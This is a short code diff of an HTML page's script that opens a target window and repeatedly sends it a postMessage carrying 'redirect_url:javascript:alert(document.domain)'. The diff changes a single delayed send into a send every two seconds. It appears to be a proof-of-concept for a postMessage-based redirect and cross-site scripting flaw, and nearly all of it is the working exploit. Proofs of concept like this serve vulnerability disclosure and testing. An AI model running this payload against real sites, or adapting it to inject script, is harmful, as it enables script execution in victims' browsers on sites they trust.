@@ -15,9 +15,9 @@
         let win = window.open(target);
         let msg = "redirect_url:javascript:alert(document.domain)"
 
-        setTimeout(function () {
+        setInterval(function () {
           win.postMessage(msg, "*");
-        }, 7000);
+        }, 2000);
       };
     </script>
   </body>
